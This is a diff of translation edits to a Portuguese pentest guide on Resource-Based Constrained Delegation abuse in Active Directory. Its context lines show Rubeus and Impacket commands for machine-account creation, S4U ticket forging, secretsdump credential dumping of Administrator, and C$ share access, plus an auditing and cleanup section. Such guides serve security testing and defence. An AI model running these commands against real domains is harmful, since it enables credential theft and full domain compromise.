@@ -48,7 +48,7 @@ New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '
 # Check if created
 Get-DomainComputer SERVICEA
 ```
-### Configurando Delegação Constrangida Baseada em Recursos
+### Configurando Delegação Constrangida Baseada em Recurso
 
 **Usando o módulo PowerShell do activedirectory**
 ```bash
@@ -72,7 +72,7 @@ msds-allowedtoactonbehalfofotheridentity
 ```
 ### Realizando um ataque S4U completo (Windows/Rubeus)
 
-Primeiro de tudo, criamos o novo objeto Computador com a senha `123456`, então precisamos do hash dessa senha:
+Primeiramente, criamos o novo objeto Computador com a senha `123456`, então precisamos do hash dessa senha:
 ```bash
 .\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
 ```
@@ -109,7 +109,7 @@ impacket-secretsdump -k -no-pass Administrator@victim.domain.local
 ```
 Notas
 - Se a assinatura LDAP/LDAPS for aplicada, use `impacket-rbcd -use-ldaps ...`.
-- Prefira chaves AES; muitos domínios modernos restringem RC4. Impacket e Rubeus suportam fluxos apenas AES.
+- Prefira chaves AES; muitos domínios modernos restringem RC4. Impacket e Rubeus suportam fluxos apenas com AES.
 - Impacket pode reescrever o `sname` ("AnySPN") para algumas ferramentas, mas obtenha o SPN correto sempre que possível (por exemplo, CIFS/LDAP/HTTP/HOST/MSSQLSvc).
 
 ### Acessando
@@ -123,7 +123,7 @@ ls \\victim.domain.local\C$
 
 Saiba mais sobre os [**tickets de serviço disponíveis aqui**](silver-ticket.md#available-services).
 
-## Enumerando, auditando e limpeza
+## Enumerating, auditing and cleanup
 
 ### Enumerar computadores com RBCD configurado
 
@@ -183,7 +183,7 @@ impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025
 adws-enumeration.md
 {{#endref}}
 
-- Cadeias de relé do Kerberos frequentemente terminam em RBCD para alcançar o SYSTEM local em um passo. Veja exemplos práticos de ponta a ponta:
+- Cadeias de relé do Kerberos frequentemente terminam em RBCD para alcançar o SYSTEM local em um único passo. Veja exemplos práticos de ponta a ponta:
 
 
 {{#ref}}
